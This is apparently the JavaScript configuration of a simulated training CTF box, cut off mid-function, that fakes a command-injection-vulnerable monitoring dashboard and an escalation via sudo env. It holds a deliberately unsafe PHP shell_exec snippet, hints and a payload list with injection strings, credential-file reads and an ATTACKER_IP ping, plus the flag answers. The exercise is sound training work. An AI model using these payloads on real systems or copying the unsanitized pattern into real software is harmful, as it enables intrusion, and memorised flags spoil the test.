/* ============================================================
   CTF ARENA — Box A3: The Phantom Shell
   Command Injection | Iron Bastion
   Config: web app, injection engine, filesystem, flags, hints, lore
   ============================================================ */

const A3Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Phantom Shell',
    subtitle: 'Command Injection — Iron Bastion',
    difficulty: 'Intermediate',
    accent: '#2ecc71',
    storageKey: 'hexworth_ctf_a3',
    trackerKey: 'ctf_a3',

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode — AR-7)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'PT0-002',
        mappings: [
            { flagId: 'user', objective: '3.1', description: 'Given a scenario, apply attacks and exploits', skill: 'Command Injection Discovery' },
            { flagId: 'root', objective: '3.1', description: 'Given a scenario, apply attacks and exploits', skill: 'Reverse Shell Escalation' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 8192 MB OK',
            'Detecting drives... /dev/sda1 (256GB SSD)',
            'PXE-E61: Media test failure, check cable',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal', icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',  icon: '\uD83C\uDF10', app: 'browser' },
            { id: 'notes',    label: 'Notes',    icon: '\uD83D\uDCDD', app: 'notes' },
            { id: 'hints',    label: 'Hints',    icon: '\uD83D\uDCA1', app: 'hints' },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9', app: 'flags' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget: 10.10.14.12\n'
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', value: 'flag{ph4nt0m_sh3ll_1nj3ct10n_d1sc0v3r3d}', points: 100 },
        { id: 'root', value: 'flag{1r0n_b4st10n_r00t_c0mpr0m1s3d}', points: 200 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1000,
        hintPenalty: -50,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 900000, points: 100 }  // 15 minutes
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: "The diagnostic tools form passes your input directly to a system command. What happens if you add a semicolon (;) after the IP?",
            penalty: -50
        },
        {
            id: 'hint2',
            text: "Try: 127.0.0.1; whoami \u2014 if it returns 'www-data', you have command injection. Now explore the filesystem.",
            penalty: -50
        },
        {
            id: 'hint3',
            text: "The user flag is in /home/monitor_svc/user.txt. Use: 127.0.0.1; cat /home/monitor_svc/user.txt",
            penalty: -50
        },
        {
            id: 'hint4',
            text: "Check sudo permissions with 127.0.0.1; sudo -l. The /usr/bin/env binary can be exploited: 127.0.0.1; sudo /usr/bin/env cat /root/root.txt",
            penalty: -50
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        outro: 'The Phantom Shell has spoken. Iron Bastion\'s system monitoring dashboard was the gateway \u2014 unsanitized input in their diagnostic tools allowed you to break free of the web application and take command of the server itself. From www-data to root, the bastion has fallen.'
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — Iron Bastion System Monitor
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://10.10.14.12/monitor/',

        pages: {

            // ── Main Dashboard ──────────────────────────
            '/monitor/': {
                title: 'Iron Bastion \u2014 System Monitor',
                html: `
                    <div style="text-align:center; margin-bottom:24px; padding-bottom:16px; border-bottom:2px solid #2ecc71;">
                        <h1 style="color:#2ecc71; font-size:1.5rem; font-family:'Courier New',monospace; margin-bottom:4px;">&#9881; Iron Bastion System Monitor</h1>
                        <div style="color:#888; font-size:0.75rem; letter-spacing:0.1em;">INFRASTRUCTURE MONITORING DASHBOARD v3.2.1</div>
                    </div>

                    <div style="display:grid; grid-template-columns:repeat(4, 1fr); gap:12px; max-width:700px; margin:0 auto 24px;">
                        <div style="background:#1a2332; border:1px solid #2ecc71; border-radius:6px; padding:14px; text-align:center;">
                            <div style="color:#2ecc71; font-size:1.4rem; font-weight:bold;">47%</div>
                            <div style="color:#888; font-size:0.7rem; margin-top:4px;">CPU USAGE</div>
                        </div>
                        <div style="background:#1a2332; border:1px solid #3498db; border-radius:6px; padding:14px; text-align:center;">
                            <div style="color:#3498db; font-size:1.4rem; font-weight:bold;">2.1 GB</div>
                            <div style="color:#888; font-size:0.7rem; margin-top:4px;">MEMORY (4GB)</div>
                        </div>
                        <div style="background:#1a2332; border:1px solid #e67e22; border-radius:6px; padding:14px; text-align:center;">
                            <div style="color:#e67e22; font-size:1.4rem; font-weight:bold;">68%</div>
                            <div style="color:#888; font-size:0.7rem; margin-top:4px;">DISK USAGE</div>
                        </div>
                        <div style="background:#1a2332; border:1px solid #2ecc71; border-radius:6px; padding:14px; text-align:center;">
                            <div style="color:#2ecc71; font-size:1.4rem; font-weight:bold;">&#9650; Up</div>
                            <div style="color:#888; font-size:0.7rem; margin-top:4px;">NETWORK</div>
                        </div>
                    </div>

                    <div style="max-width:700px; margin:0 auto;">
                        <div style="color:#888; font-size:0.7rem; letter-spacing:0.1em; margin-bottom:10px;">QUICK LINKS</div>
                        <div style="display:flex; gap:10px;">
                            <a href="/monitor/tools/" style="flex:1; display:block; padding:12px; background:#1a2332; border:1px solid #333; border-radius:6px; color:#2ecc71; text-decoration:none; text-align:center; font-size:0.85rem;">
                                &#9881; Diagnostic Tools
                            </a>
                            <a href="/monitor/logs/" style="flex:1; display:block; padding:12px; background:#1a2332; border:1px solid #333; border-radius:6px; color:#3498db; text-decoration:none; text-align:center; font-size:0.85rem;">
                                &#9776; Access Logs
                            </a>
                        </div>
                    </div>

                    <div style="margin-top:24px; padding-top:12px; border-top:1px solid #333; text-align:center; color:#555; font-size:0.65rem;">
                        Iron Bastion Monitoring Suite &copy; 2024 | Server: iron-bastion | Uptime: 47d 12h 33m
                    </div>
                `
            },

            // ── Diagnostic Tools (INJECTION ENTRY POINT) ──
            '/monitor/tools/': {
                title: 'Diagnostic Tools \u2014 Iron Bastion',
                html: `
                    <div style="margin-bottom:20px; padding-bottom:12px; border-bottom:1px solid #333;">
                        <a href="/monitor/" style="color:#2ecc71; text-decoration:none; font-size:0.75rem;">&larr; Back to Dashboard</a>
                        <h2 style="color:#2ecc71; font-size:1.2rem; font-family:'Courier New',monospace; margin-top:8px;">&#9881; Network Diagnostic Tools</h2>
                        <div style="color:#888; font-size:0.7rem;">Run network diagnostics against remote hosts</div>
                    </div>

                    <form style="max-width:550px; margin:0 auto 20px;">
                        <div style="margin-bottom:12px;">
                            <label style="display:block; color:#aaa; font-size:0.75rem; margin-bottom:4px;">Tool:</label>
                            <select name="tool" style="width:100%; padding:8px 12px; background:#1a2332; color:#eee; border:1px solid #444; border-radius:4px; font-family:inherit; font-size:0.85rem;">
                                <option value="ping">Ping</option>
                                <option value="traceroute">Traceroute</option>
                            </select>
                        </div>
                        <div style="margin-bottom:12px;">
                            <label style="display:block; color:#aaa; font-size:0.75rem; margin-bottom:4px;">Host / IP Address:</label>
                            <input type="text" name="host" placeholder="e.g. 10.10.14.12 or localhost"
                                   style="width:100%; padding:8px 12px; background:#1a2332; color:#eee; border:1px solid #444; border-radius:4px; font-family:inherit; font-size:0.85rem; box-sizing:border-box;">
                        </div>
                        <button type="submit"
                                style="padding:8px 24px; background:#2ecc71; color:#fff; border:none; border-radius:4px; font-family:inherit; font-weight:700; cursor:pointer; font-size:0.85rem;">Run Diagnostic</button>
                    </form>

                    <div data-results style="max-width:550px; margin:0 auto;">
                        <div style="color:#555; font-size:0.7rem; letter-spacing:0.1em; margin-bottom:6px;">OUTPUT</div>
                        <div style="background:#0d1117; border:1px solid #333; border-radius:4px; padding:14px; font-family:'Courier New',monospace; font-size:0.78rem; color:#ccc; white-space:pre-wrap; min-height:60px;">Waiting for diagnostic command...</div>
                    </div>

                    <div style="margin-top:16px; max-width:550px; margin-left:auto; margin-right:auto; padding:10px; background:rgba(46,204,113,0.05); border:1px solid rgba(46,204,113,0.15); border-radius:4px;">
                        <div style="color:#2ecc71; font-size:0.7rem; font-weight:bold; margin-bottom:4px;">Usage Notes:</div>
                        <div style="color:#888; font-size:0.7rem; line-height:1.5;">
                            &bull; Enter a valid IP address or hostname<br>
                            &bull; Ping sends 3 ICMP packets<br>
                            &bull; Traceroute shows the network path to the target<br>
                            &bull; Diagnostic results are logged for auditing
                        </div>
                    </div>
                `,
                formHandler: function(data, engine) {
                    return A3Config._handleDiagnostic(data, engine);
                }
            },

            // ── Access Logs ─────────────────────────────
            '/monitor/logs/': {
                title: 'Access Logs \u2014 Iron Bastion',
                html: `
                    <div style="margin-bottom:20px; padding-bottom:12px; border-bottom:1px solid #333;">
                        <a href="/monitor/" style="color:#2ecc71; text-decoration:none; font-size:0.75rem;">&larr; Back to Dashboard</a>
                        <h2 style="color:#3498db; font-size:1.2rem; font-family:'Courier New',monospace; margin-top:8px;">&#9776; Access Logs</h2>
                        <div style="color:#888; font-size:0.7rem;">Recent HTTP access log entries</div>
                    </div>

                    <div style="background:#0d1117; border:1px solid #333; border-radius:4px; padding:14px; font-family:'Courier New',monospace; font-size:0.7rem; color:#aaa; white-space:pre-wrap; line-height:1.6; overflow-x:auto;">10.10.14.12 - - [14/Mar/2024:09:12:03 +0000] "GET /monitor/ HTTP/1.1" 200 4521
10.10.14.12 - - [14/Mar/2024:09:12:15 +0000] "GET /monitor/tools/ HTTP/1.1" 200 2103
10.10.14.12 - - [14/Mar/2024:09:13:42 +0000] "POST /monitor/tools/ HTTP/1.1" 200 891
192.168.1.50 - monitor_svc [14/Mar/2024:09:15:00 +0000] "GET /monitor/api/health HTTP/1.1" 200 64
192.168.1.50 - monitor_svc [14/Mar/2024:09:15:01 +0000] "GET /monitor/api/metrics HTTP/1.1" 200 1420
10.10.14.1 - admin [14/Mar/2024:10:22:17 +0000] "GET /monitor/ HTTP/1.1" 200 4521
10.10.14.1 - admin [14/Mar/2024:10:23:05 +0000] "POST /monitor/tools/ HTTP/1.1" 200 743
127.0.0.1 - - [14/Mar/2024:11:00:00 +0000] "GET /server-status HTTP/1.1" 403 276
10.10.14.12 - - [14/Mar/2024:14:30:22 +0000] "GET /monitor/api/ HTTP/1.1" 403 276
192.168.1.50 - monitor_svc [14/Mar/2024:15:00:00 +0000] "GET /home/monitor_svc/.ssh/authorized_keys HTTP/1.1" 400 340
10.10.14.1 - admin [14/Mar/2024:16:45:11 +0000] "GET /monitor/logs/ HTTP/1.1" 200 3201</div>

                    <div style="margin-top:16px; padding:10px; background:rgba(52,152,219,0.05); border:1px solid rgba(52,152,219,0.15); border-radius:4px;">
                        <div style="color:#3498db; font-size:0.7rem; font-weight:bold; margin-bottom:4px;">Log Analysis:</div>
                        <div style="color:#888; font-size:0.7rem; line-height:1.5;">
                            &bull; Service account <span style="color:#e67e22;">monitor_svc</span> makes periodic health checks<br>
                            &bull; API endpoint at <code style="color:#ccc;">/monitor/api/</code> returns 403 (restricted)<br>
                            &bull; Note: <span style="color:#e67e22;">monitor_svc</span> home directory appears in a malformed request
                        </div>
                    </div>
                `
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // COMMAND INJECTION ENGINE
    // ═══════════════════════════════════════════════════════

    _handleDiagnostic(data, engine) {
        const tool = data.tool || 'ping';
        const host = data.host || '';

        if (!host.trim()) {
            return '<div style="background:#0d1117; border:1px solid #333; border-radius:4px; padding:14px; font-family:\'Courier New\',monospace; font-size:0.78rem; color:#e74c3c; white-space:pre-wrap;">Error: Please enter a host or IP address.</div>';
        }

        // ── Check for injection separators ──
        const injectionMatch = host.match(/^(.*?)\s*([;|]|&&|\$\(|`)([\s\S]*)$/);

        if (injectionMatch) {
            const cleanHost = injectionMatch[1].trim();
            const separator = injectionMatch[2];
            let injectedCmd = injectionMatch[3].trim();

            // Handle $() — strip trailing ) if present
            if (separator === '$(') {
                injectedCmd = injectedCmd.replace(/\)\s*$/, '');
            }
            // Handle backtick — strip trailing backtick
            if (separator === '`') {
                injectedCmd = injectedCmd.replace(/`\s*$/, '');
            }

            // Build the normal command output first
            const normalOutput = A3Config._simulateNormalCommand(tool, cleanHost);

            // Then process the injected command
            const injectedOutput = A3Config._processInjectedCommand(injectedCmd);

            return '<div style="background:#0d1117; border:1px solid #333; border-radius:4px; padding:14px; font-family:\'Courier New\',monospace; font-size:0.78rem; color:#ccc; white-space:pre-wrap;">' +
                normalOutput + '\n' + injectedOutput + '</div>';
        }

        // ── No injection — normal diagnostic output ──
        const output = A3Config._simulateNormalCommand(tool, host.trim());
        return '<div style="background:#0d1117; border:1px solid #333; border-radius:4px; padding:14px; font-family:\'Courier New\',monospace; font-size:0.78rem; color:#ccc; white-space:pre-wrap;">' +
            output + '</div>';
    },

    // ═══════════════════════════════════════════════════════
    // NORMAL COMMAND SIMULATION
    // ═══════════════════════════════════════════════════════

    _simulateNormalCommand(tool, host) {
        if (!host) host = '...';

        if (tool === 'traceroute') {
            return `traceroute to ${host} (${host}), 30 hops max, 60 byte packets
 1  gateway (10.10.14.1)  0.542 ms  0.621 ms  0.712 ms
 2  10.10.14.1 (10.10.14.1)  1.203 ms  1.318 ms  1.402 ms
 3  ${host} (${host})  2.105 ms  2.213 ms  2.301 ms`;
        }

        // Default: ping
        return `PING ${host} (${host}) 56(84) bytes of data.
64 bytes from ${host}: icmp_seq=1 ttl=64 time=0.034 ms
64 bytes from ${host}: icmp_seq=2 ttl=64 time=0.028 ms
64 bytes from ${host}: icmp_seq=3 ttl=64 time=0.031 ms

--- ${host} ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 0.028/0.031/0.034/0.002 ms`;
    },

    // ═══════════════════════════════════════════════════════
    // INJECTED COMMAND PROCESSOR
    // ═══════════════════════════════════════════════════════

    _processInjectedCommand(cmdStr) {
        if (!cmdStr.trim()) return '';

        // Handle piped commands: cmd1 | cmd2 — just process cmd1 for simplicity
        // Handle chained commands: cmd1 && cmd2
        const parts = cmdStr.split(/\s*&&\s*/);
        const results = [];

        for (const part of parts) {
            const trimmed = part.trim();
            if (!trimmed) continue;
            results.push(A3Config._executeSingleInjectedCommand(trimmed));
        }

        return results.join('\n');
    },

    _executeSingleInjectedCommand(cmd) {
        const lower = cmd.toLowerCase().trim();
        const tokens = cmd.trim().split(/\s+/);
        const base = tokens[0].toLowerCase();

        // ── whoami ──
        if (base === 'whoami') {
            return 'www-data';
        }

        // ── id ──
        if (base === 'id') {
            return 'uid=33(www-data) gid=33(www-data) groups=33(www-data)';
        }

        // ── uname ──
        if (base === 'uname') {
            return 'Linux iron-bastion 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux';
        }

        // ── pwd ──
        if (base === 'pwd') {
            return '/var/www/html/monitor';
        }

        // ── sudo ──
        if (base === 'sudo') {
            return A3Config._handleSudo(tokens.slice(1));
        }

        // ── cat ──
        if (base === 'cat') {
            return A3Config._handleInjectedCat(tokens.slice(1).join(' '));
        }

        // ── ls ──
        if (base === 'ls') {
            return A3Config._handleInjectedLs(tokens.slice(1).join(' '));
        }

        // ── find ──
        if (lower.startsWith('find ') && lower.includes('-perm')) {
            return `/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/bin/su
/usr/sbin/pppd`;
        }

        // ── ps aux ──
        if (base === 'ps') {
            return `USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.3  16964  3456 ?        Ss   Mar12   0:05 /sbin/init
root       412  0.0  0.4  72304  4820 ?        Ss   Mar12   0:12 /usr/sbin/sshd -D
www-data   891  0.0  0.8 265432  8944 ?        S    Mar12   1:24 /usr/sbin/apache2 -k start
www-data   892  0.0  0.8 265432  8712 ?        S    Mar12   1:18 /usr/sbin/apache2 -k start
www-data   893  0.0  0.7 265304  8124 ?        S    Mar12   1:15 /usr/sbin/apache2 -k start
root       904  0.0  0.3  55176  3204 ?        Ss   Mar12   0:03 /usr/sbin/cron -f
monitor+  1102  0.0  0.5  74280  5640 ?        Ss   Mar12   0:42 /usr/bin/node /opt/monitor/server.js
root      1205  0.0  0.4  72304  4200 ?        Ss   Mar12   0:00 /usr/sbin/apache2 -k start`;
        }

        // ── cat /etc/crontab ──
        if (lower.includes('crontab')) {
            return `# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5  *    * * *   monitor_svc  /opt/monitor/health_check.sh
0    */6  * * *   root         /usr/bin/logrotate /etc/logrotate.conf
17   *    * * *   root         cd / && run-parts --report /etc/cron.hourly`;
        }

        // ── env ──
        if (base === 'env' && tokens.length === 1) {
            return `PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOME=/var/www
LANG=en_US.UTF-8
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
SERVER_SOFTWARE=Apache/2.4.57 (Ubuntu)`;
        }

        // ── hostname ──
        if (base === 'hostname') {
            return 'iron-bastion';
        }

        // ── ifconfig / ip addr ──
        if (base === 'ifconfig' || (base === 'ip' && tokens[1] === 'addr')) {
            return `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.14.12  netmask 255.255.255.0  broadcast 10.10.14.255
        inet6 fe80::a00:27ff:fe8d:c04d  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:8d:c0:4d  txqueuelen 1000  (Ethernet)`;
        }

        // ── which ──
        if (base === 'which') {
            const target = tokens[1] || '';
            const bins = { 'sudo': '/usr/bin/sudo', 'env': '/usr/bin/env', 'python3': '/usr/bin/python3', 'bash': '/bin/bash', 'sh': '/bin/sh', 'cat': '/usr/bin/cat', 'ls': '/usr/bin/ls', 'curl': '/usr/bin/curl', 'wget': '/usr/bin/wget', 'nc': '/usr/bin/nc', 'nmap': '' };
            if (bins[target] !== undefined) {
                return bins[target] || `which: no ${target} in (/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin)`;
            }
            return `/usr/bin/${target}`;
        }

        // ── Unrecognized ──
        return `sh: 1: ${tokens[0]}: not found`;
    },

    // ═══════════════════════════════════════════════════════
    // SUDO HANDLER
    // ═══════════════════════════════════════════════════════

    _handleSudo(args) {
        if (!args.length) return 'usage: sudo [-h] [-u user] command';

        const joined = args.join(' ').toLowerCase();

        // sudo -l — list sudo permissions
        if (args[0] === '-l' || args[0] === '--list') {
            return `Matching Defaults entries for www-data on iron-bastion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin

User www-data may run the following commands on iron-bastion:
    (ALL) NOPASSWD: /usr/bin/env`;
        }

        // sudo /usr/bin/env ... — the privilege escalation path
        if (joined.startsWith('/usr/bin/env') || joined.startsWith('env')) {
            const envArgs = args.slice(1);
            // Skip 'env' if it was separate from sudo
            const cmdAfterEnv = (args[0].toLowerCase() === '/usr/bin/env' || args[0].toLowerCase() === 'env')
                ? args.slice(1)
                : args;

            // Filter out '/usr/bin/env' from cmdAfterEnv if present
            let execArgs = cmdAfterEnv;
            if (execArgs.length > 0 && (execArgs[0].toLowerCase() === '/usr/bin/env' || execArgs[0].toLowerCase() === 'env')) {
                execArgs = execArgs.slice(1);
            }

            const execCmd = execArgs.join(' ').toLowerCase();

            // sudo /usr/bin/env cat /root/root.txt
            if (execCmd.includes('cat') && execCmd.includes('/root/root.txt')) {
                return 'flag{1r0n_b4st10n_r00t_c0mpr0m1s3d}';
            }

            // sudo /usr/bin/env /bin/bash -c "cat /root/root.txt"
            if (execCmd.includes('bash') && execCmd.includes('/root/root.txt')) {
                return 'flag{1r0n_b4st10n_r00t_c0mpr0m1s3d}';
            }

            // sudo /usr/bin/env /bin/sh -c "cat /root/root.txt"
            if (execCmd.includes('sh') && execCmd.includes('/root/root.txt')) {
                return 'flag{1r0n_b4st10n_r00t_c0mpr0m1s3d}';
            }

            // sudo /usr/bin/env cat /root/
            if (execCmd.includes('cat') && execCmd.includes('/root/')) {
                return 'flag{1r0n_b4st10n_r00t_c0mpr0m1s3d}';
            }

            // sudo /usr/bin/env ls /root/
            if (execCmd.includes('ls') && execCmd.includes('/root')) {
                return 'root.txt  .bashrc  .profile  .ssh/';
            }

            // sudo /usr/bin/env id
            if (execCmd.trim() === 'id') {
                return 'uid=0(root) gid=0(root) groups=0(root)';
            }

            // sudo /usr/bin/env whoami
            if (execCmd.trim() === 'whoami') {
                return 'root';
            }

            // sudo /usr/bin/env /bin/bash (interactive shell — simulate)
            if (execCmd.includes('/bin/bash') || execCmd.includes('/bin/sh')) {
                if (!execCmd.includes('-c')) {
                    return 'root@iron-bastion:/var/www/html/monitor# (interactive shell spawned as root)';
                }
            }

            // Generic: run the command as root via env
            return A3Config._executeSingleInjectedCommand(execArgs.join(' '));
        }

        // Any other sudo command — permission denied (only /usr/bin/env is allowed)
        return `Sorry, user www-data is not allowed to execute '${args.join(' ')}' as root on iron-bastion.`;
    },

    // ═══════════════════════════════════════════════════════
    // INJECTED cat HANDLER (target server filesystem)
    // ═══════════════════════════════════════════════════════

    _handleInjectedCat(path) {
        const p = path.trim();

        if (p.includes('/home/monitor_svc/user.txt') || p === 'user.txt') {
            return 'flag{ph4nt0m_sh3ll_1nj3ct10n_d1sc0v3r3d}';
        }

        if (p.includes('/etc/passwd')) {
            return `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
monitor_svc:x:1001:1001::/home/monitor_svc:/bin/bash
node:x:1002:1002::/home/node:/usr/sbin/nologin`;
        }

        if (p.includes('/etc/hostname')) {
            return 'iron-bastion';
        }

        if (p.includes('/etc/shadow')) {
            return 'cat: /etc/shadow: Permission denied';
        }

        if (p.includes('/root/root.txt') || p.includes('/root/')) {
            return 'cat: /root/root.txt: Permission denied';
        }

        if (p.includes('/home/monitor_svc/.bash_history')) {
            return `cd /opt/monitor
node server.js
sudo systemctl restart apache2
cat /etc/passwd
sudo -l
ls -la /root/`;
        }

        if (p.includes('/etc/crontab')) {
            return `# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5  *    * * *   monitor_svc  /opt/monitor/health_check.sh
0    */6  * * *   root         /usr/bin/logrotate /etc/logrotate.conf
17   *    * * *   root         cd / && run-parts --report /etc/cron.hourly`;
        }

        if (p.includes('/etc/apache2/sites-enabled') || p.includes('/etc/apache2/apache2.conf')) {
            return `<VirtualHost *:80>
    ServerName iron-bastion
    DocumentRoot /var/www/html
    <Directory /var/www/html/monitor>
        AllowOverride All
        Require all granted
    </Directory>
    ErrorLog \${APACHE_LOG_DIR}/error.log
    CustomLog \${APACHE_LOG_DIR}/access.log combined
</VirtualHost>`;
        }

        if (p.includes('/opt/monitor/health_check.sh')) {
            return `#!/bin/bash
# Health check script for monitoring service
curl -s http://localhost/monitor/api/health > /dev/null
if [ $? -ne 0 ]; then
    echo "$(date) - Health check failed" >> /var/log/monitor/health.log
    systemctl restart apache2
fi`;
        }

        if (p.includes('/var/www/html/monitor/tools/index.php') || p.includes('index.php')) {
            return `<?php
// Diagnostic Tools - Iron Bastion Monitor v3.2.1
$tool = $_POST['tool'] ?? 'ping';
$host = $_POST['host'] ?? '';

if (!empty($host)) {
    if ($tool === 'traceroute') {
        $cmd = "traceroute " . $host;
    } else {
        $cmd = "ping -c 3 " . $host;
    }
    $output = shell_exec($cmd);
    echo "<pre>" . $output . "</pre>";
}
?>`;
        }

        return `cat: ${p}: No such file or directory`;
    },

    // ═══════════════════════════════════════════════════════
    // INJECTED ls HANDLER (target server filesystem)
    // ═══════════════════════════════════════════════════════

    _handleInjectedLs(args) {
        const p = args.replace(/-[la]+\s*/g, '').trim() || '/var/www/html/monitor';

        if (p === '/' || p === '-la /') {
            return `bin   boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var`;
        }

        if (p.includes('/home/monitor_svc') || p === '/home/monitor_svc/' || p === '/home/monitor_svc') {
            return `user.txt  .bash_history  .ssh/`;
        }

        if (p.includes('/home') && !p.includes('/home/monitor_svc') && !p.includes('/home/kali') && !p.includes('/home/node')) {
            return `monitor_svc  www-data`;
        }

        if (p.includes('/root')) {
            return 'ls: cannot open directory \'/root/\': Permission denied';
        }

        if (p.includes('/var/www/html/monitor') || p.includes('/var/www/html')) {
            return `index.html  tools/  logs/  api/  assets/  config.php`;
        }

        if (p.includes('/opt/monitor')) {
            return `server.js  health_check.sh  node_modules/  package.json`;
        }

        if (p.includes('/tmp')) {
            return `systemd-private-abc123  sess_4f8a2b1c`;
        }

        if (p.includes('/etc')) {
            return `apache2  crontab  hostname  hosts  passwd  shadow  ssh  sudoers  sudoers.d`;
        }

        return `ls: cannot access '${p}': No such file or directory`;
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (attacker Kali machine)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING ===\nTarget: 10.10.14.12 (Iron Bastion)\nObjective: Command Injection exploitation\n\nThe target is running a system monitoring dashboard.\nRecon indicates a diagnostic tools page that may pass\nunsanitized user input to system commands.\n\nRecon steps:\n1. nmap scan to identify services\n2. Browse the web application at http://10.10.14.12/monitor/\n3. Locate the diagnostic tools page\n4. Test for command injection in input fields\n5. Escalate privileges and find both flags\n\nRemember: semicolons, pipes, and backticks are your friends.\n\nGood luck, operator.'
                                },
                                'payloads': {
                                    type: 'dir',
                                    children: {
                                        'cmd-injection.txt': {
                                            type: 'file',
                                            content: '=== COMMAND INJECTION PAYLOADS ===\n\n; whoami\n| whoami\n&& whoami\n`whoami`\n$(whoami)\n\n; cat /etc/passwd\n; ls -la /home/\n; id\n; uname -a\n\n=== BLIND INJECTION ===\n; sleep 5\n| sleep 5\n; ping -c 3 ATTACKER_IP\n\n=== PRIVILEGE ESCALATION ===\n; sudo -l\n; find / -perm -4000 2>/dev/null\n; cat /etc/sudoers'
                                        }
                                    }
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'nmap 10.10.14.12\nnmap -sV -sC 10.10.14.12\ncurl http://10.10.14.12/monitor/\ncurl http://10.10.14.12/monitor/tools/\nfirefox http://10.10.14.12/monitor/'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'rockyou.txt': {
                                            type: 'file',
                                            content: '[rockyou.txt \u2014 14,341,564 passwords \u2014 file too large to display]'
                                        },
                                        'dirb': {
                                            type: 'dir',
                                            children: {
                                                'common.txt': {
                                                    type: 'file',
                                                    content: 'admin\napi\nbackup\ncgi-bin\nconfig\ndata\ndb\nimages\nindex\nlogin\nmonitor\nphpmyadmin\nserver-status\nstatus\ntest\ntools\nuploads'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'kali'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific Kali tools)
    // ═══════════════════════════════════════════════════════

    commands: {
        'nmap': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target || target === '10.10.14.12') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.14.12
Host is up (0.028s latency).
Not shown: 997 closed tcp ports

PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh        OpenSSH 8.9p1
80/tcp   open     http       Apache httpd 2.4.57 (Ubuntu)
3000/tcp filtered http-proxy Node.js Express

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 12.37 seconds`;
            }
